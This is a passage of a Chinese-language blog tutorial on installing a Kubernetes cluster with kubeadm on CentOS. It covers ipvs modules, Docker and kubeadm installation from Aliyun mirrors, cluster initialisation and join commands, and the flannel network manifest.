class="line">MaxRetentionSec=2week</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不将日志转发到 syslog</span></span><br><span class="line">ForwardToSyslog=no</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">systemctl restart systemd-journald</span><br></pre></td></tr></table></figure><h3 id="2-6-8-kube-proxy开启ipvs的前置条件（所有节点都要操作）"><a href="#2-6-8-kube-proxy开启ipvs的前置条件（所有节点都要操作）" class="headerlink" title="2.6.8 kube-proxy开启ipvs的前置条件（所有节点都要操作）"></a>2.6.8 kube-proxy开启ipvs的前置条件（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF&gt; /etc/sysconfig/modules/ipvs.modules </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">modprobe -- ip_vs</span><br><span class="line">modprobe -- ip_vs_rr</span><br><span class="line">modprobe -- ip_vs_wrr</span><br><span class="line">modprobe -- ip_vs_sh</span><br><span class="line">modprobe -- nf_conntrack_ipv4</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">chmod 755 /etc/sysconfig/modules/ipvs.modules &amp;&amp; bash /etc/sysconfig/modules/ipvs.modules &amp;&amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4</span><br></pre></td></tr></table></figure><h3 id="2-6-9-安装-Docker-软件（所有节点都要操作）"><a href="#2-6-9-安装-Docker-软件（所有节点都要操作）" class="headerlink" title="2.6.9 安装 Docker 软件（所有节点都要操作）"></a>2.6.9 安装 Docker 软件（所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class="line"></span><br><span class="line">yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">yum install -y docker-ce</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># 创建 /etc/docker 目录</span></span></span><br><span class="line">mkdir /etc/docker</span><br><span class="line"></span><br><span class="line">cat &gt; /etc/docker/daemon.json &lt;&lt;EOF</span><br><span class="line">&#123;</span><br><span class="line">&quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span><br><span class="line">&quot;log-driver&quot;: &quot;json-file&quot;,</span><br><span class="line">&quot;log-opts&quot;: &#123;</span><br><span class="line">&quot;max-size&quot;: &quot;100m&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启docker服务</span></span><br><span class="line">systemctl daemon-reload &amp;&amp; systemctl restart docker &amp;&amp; systemctl enable docker</span><br></pre></td></tr></table></figure><p>上传文件到<code>/etc/yum.repos.d/</code>目录下，也可以 代替 <code>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</code> 命令</p><p>docker-ce.repo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[docker-ce-stable]</span><br><span class="line">name=Docker CE Stable - $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/stable</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-stable-debuginfo]</span><br><span class="line">name=Docker CE Stable - Debuginfo $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/stable</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-stable-source]</span><br><span class="line">name=Docker CE Stable - Sources</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/stable</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-test]</span><br><span class="line">name=Docker CE Test - $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/test</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-test-debuginfo]</span><br><span class="line">name=Docker CE Test - Debuginfo $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/test</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-test-source]</span><br><span class="line">name=Docker CE Test - Sources</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/test</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-nightly]</span><br><span class="line">name=Docker CE Nightly - $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/$basearch/nightly</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-nightly-debuginfo]</span><br><span class="line">name=Docker CE Nightly - Debuginfo $basearch</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/debug-$basearch/nightly</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br><span class="line"></span><br><span class="line">[docker-ce-nightly-source]</span><br><span class="line">name=Docker CE Nightly - Sources</span><br><span class="line">baseurl=https://mirrors.aliyun.com/docker-ce/linux/centos/$releasever/source/nightly</span><br><span class="line">enabled=0</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/docker-ce/linux/centos/gpg</span><br></pre></td></tr></table></figure><h3 id="2-6-10-安装-Kubeadm-（所有节点都要操作）"><a href="#2-6-10-安装-Kubeadm-（所有节点都要操作）" class="headerlink" title="2.6.10 安装 Kubeadm （所有节点都要操作）"></a>2.6.10 安装 Kubeadm （所有节点都要操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo</span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes</span><br><span class="line">baseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64</span><br><span class="line">enabled=1</span><br><span class="line">gpgcheck=0</span><br><span class="line">repo_gpgcheck=0</span><br><span class="line">gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg</span><br><span class="line">http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">yum install -y kubelet kubeadm kubectl &amp;&amp; systemctl enable kubelet</span><br></pre></td></tr></table></figure><h2 id="2-7-部署Kubernetes-Master"><a href="#2-7-部署Kubernetes-Master" class="headerlink" title="2.7 部署Kubernetes Master"></a>2.7 部署Kubernetes Master</h2><h3 id="2-7-1-初始化主节点（主节点操作）"><a href="#2-7-1-初始化主节点（主节点操作）" class="headerlink" title="2.7.1 初始化主节点（主节点操作）"></a>2.7.1 初始化主节点（主节点操作）</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kubeadm init --apiserver-advertise-address=192.168.5.3 --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.21.1 --service-cidr=10.96.0.0/12 --pod-network-cidr=10.244.0.0/16</span><br><span class="line"></span><br><span class="line">mkdir -p $HOME/.kube</span><br><span class="line"></span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br></pre></td></tr></table></figure><h3 id="2-7-2-加入主节点以及其余工作节点"><a href="#2-7-2-加入主节点以及其余工作节点" class="headerlink" title="2.7.2 加入主节点以及其余工作节点"></a>2.7.2 加入主节点以及其余工作节点</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubeadm join 192.168.5.3:6443 --token h0uelc.l46qp29nxscke7f7 \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:abc807778e24bff73362ceeb783cc7f6feec96f20b4fd707c3f8e8312294e28f </span><br></pre></td></tr></table></figure><h3 id="2-7-3-部署网络"><a href="#2-7-3-部署网络" class="headerlink" title="2.7.3 部署网络"></a>2.7.3 部署网络</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</span><br></pre></td></tr></table></figure><p>下边是文件</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">policy/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">PodSecurityPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">psp.flannel.unprivileged</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">seccomp.security.alpha.kubernetes.io/allowedProfileNames:</span> <span class="string">docker/default</span></span><br><span class="line">    <span class="attr">seccomp.security.alpha.kubernetes.io/defaultProfileName:</span> <span class="string">docker/default</span></span><br><span class="line">    <span class="attr">apparmor.security.beta.kubernetes.io/allowedProfileNames:</span> <span class="string">runtime/default</span></span><br><span class="line">    <span class="attr">apparmor.security.beta.kubernetes.io/defaultProfileName:</span> <span class="string">runtime/default</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">privileged:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">configMap</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">secret</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">emptyDir</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">hostPath</span></span><br><span class="line">  <span class="attr">allowedHostPaths:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">pathPrefix:</span> <span class="string">&quot;/etc/cni/net.d&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">pathPrefix:</span> <span class="string">&quot;/etc/kube-flannel&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">pathPrefix:</span> <span class="string">&quot;/run/flannel&quot;</span></span><br><span class="line">  <span class="attr">readOnlyRootFilesystem:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Users and groups</span></span><br><span class="line">  <span class="attr">runAsUser:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">supplementalGroups:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="attr">fsGroup:</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">RunAsAny</span></span><br><span class="line">  <span class="comment"># Privilege Escalation</span></span><br><span class="line">  <span class="attr">allowPrivilegeEscalation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">defaultAllowPrivilegeEscalation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment"># Capabilities</span></span><br><span class="line">  <span class="attr">allowedCapabilities:</span> [<span class="string">&#x27;NET_ADMIN&#x27;</span>, <span class="string">&#x27;NET_RAW&#x27;</span>]</span><br><span class="line">  <span class="attr">defaultAddCapabilities:</span> []</span><br><span class="line">  <span class="attr">requiredDropCapabilities:</span> []</span><br><span class="line">  <span class="comment"># Host namespaces</span></span><br><span class="line">  <span class="attr">hostPID:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">hostIPC:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hostPorts:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">min:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">max:</span> <span class="number">65535</span></span><br><span class="line">  <span class="comment"># SELinux</span></span><br><span class="line">  <span class="attr">seLinux:</span></span><br><span class="line">    <span class="comment"># SELinux is unused in CaaSP</span></span><br><span class="line">    <span class="attr">rule:</span> <span class="string">&#x27;RunAsAny&#x27;</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&#x27;extensions&#x27;</span>]</span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&#x27;podsecuritypolicies&#x27;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&#x27;use&#x27;</span>]</span><br><span class="line">  <span class="attr">resourceNames:</span> [<span class="string">&#x27;psp.flannel.unprivileged&#x27;</span>]</span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pods</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">get</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">nodes</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">list</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">watch</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="attr">resources:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">nodes/status</span></span><br><span class="line">  <span class="attr">verbs:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">patch</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">flannel</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-flannel-cfg</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">node</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">cni-conf.json:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;name&quot;: &quot;cbr0&quot;,</span></span><br><span class="line"><span class="string">      &quot;cniVersion&quot;: &quot;0.3.1&quot;,</span></span><br><span class="line"><span class="string">      &quot;plugins&quot;: [</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          &quot;type&quot;: &quot;flannel&quot;,</span></span><br><span class="line"><span class="string">          &quot;delegate&quot;: &#123;</span></span><br><span class="line"><span class="string">            &quot;hairpinMode&quot;: true,</span></span><br><span class="line"><span class="string">            &quot;isDefaultGateway&quot;: true</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;,</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          &quot;type&quot;: &quot;portmap&quot;,</span></span><br><span class="line"><span class="string">          &quot;capabilities&quot;: &#123;</span></span><br><span class="line"><span class="string">            &quot;portMappings&quot;: true</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      ]</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span>  <span class="attr">net-conf.json:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      &quot;Network&quot;: &quot;10.244.0.0/16&quot;,</span></span><br><span class="line"><span class="string">      &quot;Backend&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;Type&quot;: &quot;vxlan&quot;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span><span class="meta">---</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">DaemonSet</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kube-flannel-ds</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">kube-system</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">tier:</span> <span class="string">node</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">flannel</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">flannel</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">tier:</span> <span class="string">node</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">flannel</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">affinity:</span></span><br><span class="line">        <span class="attr">nodeAffinity:</span></span><br><span class="line">          <span class="attr">requiredDuringSchedulingIgnoredDuringExecution:</span></span><br><span class="line">            <span class="attr">nodeSelectorTerms:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">matchExpressions:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">kubernetes.io/os</span></span><br><span class="line">                <span class="attr">operator:</span> <span class="string">In</span></span><br><span class="line">                <span class="attr">values:</span></span><br><span class="line">                <span class="bullet">-</span> <span class="string">linux</span></span><br><span class="line">      <span class="attr">hostNetwork:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">priorityClassName:</span> <span class="string">system-node-critical</span></span><br><span class="line">      <span class="attr">tolerations:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">operator:</span> <span class="string">Exists</span></span><br><span class="line">        <span class="attr">effect:</span> <span class="string">NoSchedule</span></span><br><span class="line">      <span class="attr">serviceAccountName:</span> <span class="string">flannel</span></span><br><span class="line">      <span class="attr">initContainers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install-cni</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">quay.io/coreos/flannel:v0.14.0</span></span><br><span class="line">        <span class="attr">command:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">cp</span></span><br><span class="line">        <span class="attr">args:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">-f</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/etc/kube-flannel/cni-conf.json</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">/etc/cni/net.d/10-flannel.conflist</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cni</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/etc/cni/net.d</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">flannel-cfg</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/etc/kube-flannel/</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">kube-flannel</span></span><br><span class="line">        <span class="attr">image:</span> <span 